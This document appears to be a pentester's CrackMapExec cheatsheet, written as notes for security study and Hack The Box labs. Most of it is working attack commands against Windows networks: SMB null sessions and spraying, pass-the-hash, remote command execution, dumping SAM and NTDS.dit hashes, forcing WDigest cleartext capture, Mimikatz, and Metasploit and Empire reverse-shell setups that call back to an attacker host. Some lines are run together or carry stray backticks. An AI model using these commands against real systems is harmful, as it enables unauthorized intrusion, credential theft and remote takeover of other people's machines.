# Crackmapexec Cheatsheet
Contains the submodules
-   [Impacket](https://github.com/CoreSecurity/impacket)
-   [Pywinrm](https://github.com/diyan/pywinrm)
-   [Pywerview](https://github.com/the-useless-one/pywerview)
-   [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
-   [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
-   [Invoke-Vnc](https://github.com/artkond/Invoke-Vnc)
-   [Mimikittenz](https://github.com/putterpanda/mimikittenz)
-   [NetRipper](https://github.com/NytroRST/NetRipper)
-   [RandomPS-Scripts](https://github.com/xorrior/RandomPS-Scripts)
-   [SessionGopher](https://github.com/fireeye/SessionGopher)
-   [Mimipenguin](https://github.com/huntergregal/mimipenguin)

## Modules

```shell
-M spider_plus # spider share outputs json
```

## Connecting
```bash
crackmapexec smb $domain
crackmapexec smb $IP $IP-2
crackmapexec smb $IP-Range $IP-Range-More-Specific 
crackmapexec smb $Subnetmask
crackmapexec smb targets.txt
```

## Shares
Similar checklist from Ippsec to match the pentester use case of [[SMB-Recon-Cheatsheet]] `smbclient`, to enumerate specific configuration, but also Pentester are more *"finickity"*:

```bash
crackmapexec smb $IP --shares
crackmapexec smb $IP --shares -u ''
crackmapexec smb $IP --shares -u 'Test'
crackmapexec smb $IP --shares -u 'Test' -p ''
```

## Null sessions
```bash
crackmapexec smb $IP -u "" -p ""
```

With Null sessions Windows System that upgraded from 2003, anonymous authenication to grab password policy:
```bash
crackmapexec smb $IP -u '' -p '' --pass-pol
```
Account lockout threshold: 0 -> bruteforcing with [[Password-Attacks]] 

```bash
crackmapexec smb $IP  -u <user> -p <password>
```

## Spraying
#### Pass the hash against a subnet
```bash
# The LMHASH does not actually matter
crackmapexec smb $Subnetmask -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb $Subnetmask -u administrator -H 'NTHASH'
```

## Enumeration
#### Users
```bash
crackmapexec smb $IP -u '$foothold-account' -p '$password' --users
crackmapexec smb $IP -u '$foothold-account' -p '$password' --rid-brute
crackmapexec smb $IP -u '$foothold-account' -p '$password' --groups
crackmapexec smb $IP -u '$foothold-account' -p '$password' --local-users
crackmapexec smb $IP -u '$foothold-account' -p '$password' --shares
crackmapexec smb $IP -u '$foothold-account' -p '$password' --pass-pol
```

### Execution & Co
```bash
# CrackMapExec has 3 different command execution methods (in default order) : 
# - wmiexec --> WMI 
# - atexec --> scheduled task 
# - smbexec --> creating and running a service  
# Execute command through cmd.exe (admin privileges required) 
crackmapexec smb $ip -u Administrator -p 'P@ssw0rd' -x 'whoami'  
# Force the smbexec method 
crackmapexec smb $ip -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec  
# Execute commands through PowerShell (admin privileges required) 
crackmapexec smb $ip -u Administrator -p 'P@ssw0rd' -X 'whoami'`
```

  

### Getting Credentials
```bash
# Dump local SAM hashes 
crackmapexec smb $ip -u 'Administrator' -p 'PASS' --local-auth --sam

# Enable or disable WDigest to get credentials from the LSA Memory 
crackmapexec smb $ip -u 'Administrator' -p 'PASS' --local-auth --wdigest enable 
crackmapexec smb $ip -u 'Administrator' -p 'PASS' --local-auth --wdigest disable  
# Then you just have to wait the user logoff and logon again 
# But you can force the logoff 
crackmapexec smb $ip -u 'Administrator' -p 'PASS' -x 'quser' 
crackmapexec smb $ip -u 'Administrator' -p 'PASS' -x 'logoff <sessionid>'

# Dump the NTDS.dit from DC using methods from secretsdump.py  
# Uses drsuapi RPC interface create a handle, trigger replication 
# and combined with additional drsuapi calls to convert the resultant  
# linked-lists into readable format 
crackmapexec smb $ip -u UserNAme -p 'PASSWORDHERE' --ntds  
# Uses the Volume Shadow copy Service 
crackmapexec smb $ip -u UserNAme -p 'PASSWORDHERE' --ntds vss  
# Dump the NTDS.dit password history smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history`
```
 

### Using the database

```bash
# The database automatically store every hosts reaches by CME and all credentials with admin access 
$ cmedb  
# Using workspaces cmedb> workspace create test cmedb> workspace test  
# Access a protocol database and switch back 
cmedb (test)> proto smb 
cmedb (test)> back  
# List stored hosts 
cmedb> hosts  
# View detailed infos for a specific machine (including creds) cmedb> hosts <hostname>  
# Get stored credentials 
cmedb> creds  
# Get credentials access for a specific account 
cmedb> creds <username>  
# Using credentials from the database 
crackmapexec smb $ip -id <credsID>`
```
 

### Modules
```bash
# List available modules 
crackmapexec smb -L  
# Module information
crackmapexec smb -M mimikatz --module-info  
# View module options 
crackmapexec smb -M mimikatz --options  
# Mimikatz module 
crackmapexec smb $ip -u 'Administrator' -p 'PASS' --local-auth -M mimikatz 
crackmapexec smb $ip -u 'Administrator' -p 'PASS' -M mimikatz crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'

[*] Get-ComputerDetails       Enumerates sysinfo 
[*] bloodhound                Executes the BloodHound recon script on the target and retreives the results to the attackers\' machine 
[*] empire_exec               Uses Empire\'s RESTful API to generate a launcher for the specified listener and executes it 
[*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI 
[*] enum_chrome               Decrypts saved Chrome passwords using Get-ChromeDump 
[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server 
[*] get_keystrokes            Logs keys pressed, time and the active window 
[*] get_netdomaincontroller   Enumerates all domain controllers 
[*] get_netrdpsession         Enumerates all active RDP sessions 
[*] get_timedscreenshot       Takes screenshots at a regular interval 
[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password. 
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences. 
[*] invoke_sessiongopher      Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher 
[*] invoke_vnc                Injects a VNC client in memory 
[*] met_inject                Downloads the Meterpreter stager and injects it into memory 
[*] mimikatz                  Dumps all logon credentials from memory 
[*] mimikatz_enum_chrome      Decrypts saved Chrome passwords using Mimikatz 
[*] mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager [*] mimikittenz               Executes Mimikittenz 
[*] multirdp                  Patches terminal services in memory to allow multiple RDP users [*] netripper                 Capture \'s credentials by using API hooking 
[*] pe_inject                 Downloads the specified DLL/EXE and injects it into memory 
[*] rdp                       Enables/Disables RDP 
[*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares 
[*] shellcode_inject          Downloads the specified raw shellcode and injects it into memory [*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions 
[*] test_connection           Pings a host 
[*] tokens                    Enumerates available tokens [*] uac                       Checks UAC status 
[*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1 
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
```
 

### Getting shells

#### Metasploit
```bash
# First, set up a HTTP Reverse Handler 
msf > use exploit/multi/handler  
msf exploit(handler) > set payload windows/meterpreter/reverse_https 
msf exploit(handler) > set LHOST 192.168.10.3 msf exploit(handler) > set exitonsession false msf exploit(handler) > exploit -j  
# Met_Inject module 
crackmapexec smb $ip -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=YOURIP LPORT=4444` 
```
`
#### Empire
```bash
# Start RESTful API 
empire --rest --user empireadmin --pass gH25Iv1K68@^  
# First setup an Empire HTTP listener 
(Empire: listeners) > set Name test 
(Empire: listeners) > set Host $ip
(Empire: listeners) > set Port 9090 
(Empire: listeners) > set CertPath data/empire.pem 
(Empire: listeners) > run (Empire: listeners) > list  
# Start RESTful API # The username and password that CME uses to authenticate to Empire's RESTful API  
# Are stored in the cme.conf file located at ~/.cme/cme.conf 
empire --rest --user empireadmin --pass $password 
# Empire Module 
crackmapexec smb $ip -u Administrator -p PASSWORD --local-auth -M empire_exec -o LISTENER=CMETest
```

## References

[ivoidwarranties](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/)
[haax9](https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/)
[haax9 -Github](https://github.com/Haax9)
[blackhatethicalhacking](https://www.blackhatethicalhacking.com/tools/crackmapexec/)
[Ippsec Blackfield HTB](https://www.youtube.com/watch?v=IfCysW0Od8w)